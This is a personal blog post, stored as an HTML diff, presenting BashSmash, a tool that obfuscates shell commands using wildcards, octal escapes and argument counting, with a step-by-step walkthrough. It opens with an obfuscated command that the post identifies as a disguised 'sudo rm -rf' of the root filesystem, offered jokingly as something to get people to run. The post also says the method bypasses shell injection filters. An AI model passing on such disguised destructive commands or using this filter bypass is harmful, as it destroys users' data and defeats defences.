@@ -1,0 +1,248 @@
+<head>
+    <title>Evan Pratten</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/github-syntax.css">
+    <link href="https://fonts.googleapis.com/css?family=IBM+Plex+Mono:400,400i|IBM+Plex+Sans:100,100i,400,400i,700,700i" rel="stylesheet">
+</head>
+
+<body>
+
+    <div class="site-ctr">
+        <!-- Navbar -->
+        <nav class="navbar navbar-dark sticky-top bg-dark navbar-expand-lg">
+    <!-- Navbar content -->
+    <!-- <div class="container"> -->
+    <a class="navbar-brand" href="/">Evan Pratten</a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup"
+        aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+        <div class="navbar-nav ml-auto">
+            <a class="nav-item nav-link" href="/blog">Blog</a>
+            <a class="nav-item nav-link" href="/projects">Projects</a>
+            <!-- <a class="nav-item nav-link" href="/documentation">Documentation</a> -->
+            <a class="nav-item nav-link" href="/about">About</a>
+        </div>
+        <!-- </div> -->
+    </div>
+</nav>
+        <!-- <div style="height:5vh"></div> -->
+
+        <!-- Header -->
+        <!-- <div class="header">
+            <div class="container">
+                <div class="content">
+                </div>
+            </div>
+            <div class="header-gap"></div>
+        </div> -->
+
+        <div class="reactive-bg">
+            <div class="post container">
+                <h1>BashSmash</h1>
+                <h4>A tool for driving people crazy</h4>
+                <hr>
+                <p><em>2019-06-26 11:48:00 -0400</em></p>
+
+                <br>
+
+                <p>I was watching this great <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiOhNze_4fjAhUiB50JHR12D8AQwqsBMAB6BAgJEAQ&amp;url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D6D1LnMj0Yt0&amp;usg=AOvVaw2nOgft0SoPZujc9js9Vxhx">Liveoverflow video</a> yesterday, and really liked the idea of building escape sequences with strings. So, I built a new tool, <a href="https://pypi.org/project/bashsmash/">BashSmash</a>.</p>
+
+<h2 id="the-goal">The goal</h2>
+<p>The goal of BashSmash is very similar to that described in Liveoverflow’s video. Do anything in bash without using any letters or numbers except <code class="highlighter-rouge">n</code> and <code class="highlighter-rouge">f</code> (he used <code class="highlighter-rouge">i</code> instead of <code class="highlighter-rouge">f</code>). This can both bypass shell injection filters, and generally mess with people.</p>
+
+<p>Saying “Hey, you should run:”</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__<span class="o">()</span> <span class="o">{</span>/???/???/???n?f <span class="k">${#}</span><span class="p">;</span><span class="o">}</span><span class="p">;</span> <span class="si">$(</span>/???/???/???n?f <span class="si">$(</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span><span class="si">)</span><span class="p">;</span><span class="si">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Instead of:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo rm</span> <span class="nt">-rf</span> <span class="nt">--no-preserve--root</span> /
+</code></pre></div></div>
+
+<p>Can usually get you much farther with your goal of world domination.</p>
+
+<h2 id="how-does-this-work">How does this work?</h2>
+<p>BashSmash abuses bash wildcards, octal escape codes, and a large number of backslashes to obfuscate any valid shell script.</p>
+
+<p>Firstly, it is important to know that <code class="highlighter-rouge">printf</code> will gladly convert any octal to a string, and bash’s eval (<code class="highlighter-rouge">$()</code>) function will gladly run any string as a bash script. (See where this is going?)</p>
+
+<p>Because of these tools, we know that the following is possible:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Printf-ing a string will print the string</span>
+<span class="nb">printf</span> <span class="s2">"hello"</span> <span class="c"># This will return hello</span>
+
+<span class="c"># Printf-ing a sequence of octal escapes will also print a string</span>
+<span class="nb">printf</span> <span class="s2">"</span><span class="se">\1</span><span class="s2">50</span><span class="se">\1</span><span class="s2">45</span><span class="se">\1</span><span class="s2">54</span><span class="se">\1</span><span class="s2">54</span><span class="se">\1</span><span class="s2">57"</span> <span class="c"># This will also return hello</span>
+
+<span class="c"># Eval-ing a printf of an octal escape sequence will build a string, then run it in bash</span>
+<span class="si">$(</span><span class="nb">printf</span> <span class="s2">"</span><span class="se">\1</span><span class="s2">50</span><span class="se">\1</span><span class="s2">45</span><span class="se">\1</span><span class="s2">54</span><span class="se">\1</span><span class="s2">54</span><span class="se">\1</span><span class="s2">57"</span><span class="si">)</span> <span class="c"># This will warn that "hello" is not a valid command</span>
+</code></pre></div></div>
+
+<p>This has some issues. You may have noticed that letters are required to spell <code class="highlighter-rouge">printf</code>, and numbers are needed for the octal escapes. Let’s start by fixing the letters problem.</p>
+
+<p>Bash allows wildcards. You may have run something like <code class="highlighter-rouge">cp ./foo/* ./bar</code> before. This uses the wildcard <code class="highlighter-rouge">*</code>. The <code class="highlighter-rouge">*</code> wildcard will be auto-evaluated to expand into a list of all files in it’s place.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Let's assume that ./foo contains the following files:</span>
+<span class="c">#   john.txt</span>
+<span class="c">#   carl.txt</span>
+
+<span class="c"># Running the following:</span>
+<span class="nb">cat</span> ./foo/<span class="k">*</span>
+
+<span class="c"># Will automatically expand to:</span>
+<span class="nb">cat</span> ./foo/john.txt ./foo/carl.txt
+
+<span class="c"># Now, lets assume that ./baz contains a single file:</span>
+<span class="c">#   KillHumans.sh</span>
+
+<span class="c"># Running:</span>
+./baz/<span class="k">*</span>
+
+<span class="c"># Will execute KillHumans.sh</span>
+</code></pre></div></div>
+
+<p>Neat, Right? To take this a step further, you can use the second wildcard, <code class="highlighter-rouge">?</code>, to specify the number of characters you want to look for. Running <code class="highlighter-rouge">./baz/?</code> will not run <code class="highlighter-rouge">KillHumans.sh</code> because <code class="highlighter-rouge">KillHumans.sh</code> is not 1 char long. But <code class="highlighter-rouge">./baz/?????????????</code> will. This is messy, but it works.</p>
+
+<p>Now, back to our problem with <code class="highlighter-rouge">printf</code>. <code class="highlighter-rouge">printf</code> is located in <code class="highlighter-rouge">/usr/bin/printf</code> on all *nix systems. This is handy as, firstly, this can be wildcarded, and secondly, the path contains 2 <code class="highlighter-rouge">n</code>’s and an <code class="highlighter-rouge">f</code> (the two letters we are allowed to use). So, instead of calling <code class="highlighter-rouge">printf</code>, we can call <code class="highlighter-rouge">/???/??n/???n?f</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Now, we can call:</span>
+/???/??n/???n?f <span class="s2">"</span><span class="se">\1</span><span class="s2">50</span><span class="se">\1</span><span class="s2">45</span><span class="se">\1</span><span class="s2">54</span><span class="se">\1</span><span class="s2">54</span><span class="se">\1</span><span class="s2">57"</span>
+
+<span class="c"># To print "hello". Or:</span>
+<span class="si">$(</span>/???/??n/???n?f <span class="s2">"</span><span class="se">\1</span><span class="s2">50</span><span class="se">\1</span><span class="s2">45</span><span class="se">\1</span><span class="s2">54</span><span class="se">\1</span><span class="s2">54</span><span class="se">\1</span><span class="s2">57"</span><span class="si">)</span>
+
+<span class="c"># To run "hello" as a program (still gives an error)</span>
+</code></pre></div></div>
+
+<p>Now, our problem with letters is solved, but we are still using numbers.</p>
+
+<p>Bash allows anyone to define functions. These functions can take arguments and call other programs. So, what if we have a function that can take any number of arguments, and return the number of arguments as a number? This will be helpful because an empty argument can be added with <code class="highlighter-rouge">""</code> (not a number or letter), and this will replace the need for numbers in our code. On a side note, bash allows <code class="highlighter-rouge">__</code> as a function name, so that’s cool.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Our function needs to do the following:</span>
+<span class="c">#   - Take any number of arguments</span>
+<span class="c">#   - Turn the number to a string</span>
+<span class="c">#   - Print the string so it can be evaluated back to a number with $()</span>
+
+<span class="c"># First, we start with an empty function, named __ (two underscores)</span>
+__<span class="o">()</span> <span class="o">{}</span><span class="p">;</span>
+
+<span class="c"># Easy. Next, we use a built-in feature of bash to count the number of arguments passed</span>
+__<span class="o">()</span> <span class="o">{</span> <span class="k">${#}</span> <span class="o">}</span><span class="p">;</span>
+
+<span class="c"># With the ${#} feature in bash, giving this function 3 arguments will return a 3</span>
+<span class="c"># Next, we need to print this number to stdout </span>
+<span class="c"># This can be done with printf</span>
+<span class="c"># We still do not want to use any letters or numbers, so we must use our string of wildcards</span>
+/???/??n/???n?f
+
+<span class="c"># So, we just plug this into our function</span>
+__<span class="o">()</span> <span class="o">{</span>/???/??n/???n?f <span class="k">${#}</span><span class="o">}</span><span class="p">;</span>
+
+<span class="c"># Now, calling our function with three arguments</span>
+__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span>
+<span class="c"># Will print:</span>
+3
+</code></pre></div></div>
+
+<p>Let’s put this together. First, we must tell bash that our <code class="highlighter-rouge">__</code> function exists.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># We do this by starting our new script with: </span>
+__<span class="o">()</span> <span class="o">{</span>/???/??n/???n?f <span class="k">${#}</span><span class="o">}</span><span class="p">;</span>
+
+<span class="c"># Next, an eval to actually run our constructed string. Together it now looks like this:</span>
+__<span class="o">()</span> <span class="o">{</span>/???/??n/???n?f <span class="k">${#}</span><span class="o">)</span><span class="p">;</span> <span class="si">$(</span>/???/??n/???n?f <span class="si">)</span>
+
+<span class="c"># Now, we construct a string using the __ function over and over again. "echo hello" looks like:</span>
+__<span class="o">()</span> <span class="o">{</span>/???/???/???n?f <span class="k">${#}</span><span class="p">;</span><span class="o">}</span><span class="p">;</span> <span class="si">$(</span>/???/???/???n?f <span class="si">$(</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span>/???/???/???n?f <span class="s2">"</span><span class="se">\\\\</span><span class="sb">`</span>__ <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">``</span>__ <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="s2">""</span> <span class="sb">`</span><span class="s2">"</span><span class="p">;</span><span class="si">)</span><span class="p">;</span><span class="si">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Thats it! You do not actually have to worry about this, because BashSmash does it all for you automatically.</p>
+
+<h2 id="how-do-i-use-the-script">How do I use the script?</h2>
+<p>To use BashSmash, simply make sure both <code class="highlighter-rouge">python3.7</code> and <code class="highlighter-rouge">python3-pip</code> are installed on your computer, then run:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip3 install bashsmash
+</code></pre></div></div>
+
+<p>For more info, see the <a href="https://pypi.org/project/bashsmash/">PYPI Page</a>.</p>
+
+<h2 id="why-do-you-have-a-desire-to-break-things-with-python">Why do you have a desire to break things with python</h2>
+<p>Because it is fun. Give it a try!</p>
+
+<p>I will have a post here at some point about the weird things I do in my python code and why I do them.</p>
+
+            </div>
+        </div>
+
+    </div>
+    <div class="container">
+    <hr>
+</div>
+<nav class="navbar  navbar-expand-lg ">
+
+    <!-- Navbar content -->
+    <div class="container">
+
+        <span class="navbar-text">
+            Site design by: <a href="https://retrylife.ca">Evan Pratten</a> |
+
+            This site was last updated at: 2019-08-21 12:48:55 -0400
+        </span>
+    </div>
+</nav>
+
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
+    integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+    crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
+    integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
+    crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
+    integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
+    crossorigin="anonymous"></script>
+
+<!-- Offsets for links -->
+<script>
+    (function ($, window) {
+        var adjustAnchor = function () {
+
+            var $anchor = $(':target'),
+                fixedElementHeight = 100;
+
+            if ($anchor.length > 0) {
+
+                window.scrollTo(0, $anchor.offset().top - fixedElementHeight);
+            }
+
+        };
+
+        $(window).on('hashchange load', function () {
+            adjustAnchor();
+        });
+
+    })(jQuery, window);
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-74118570-2"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'UA-74118570-2');
+</script>
+
+
+<!-- particles -->
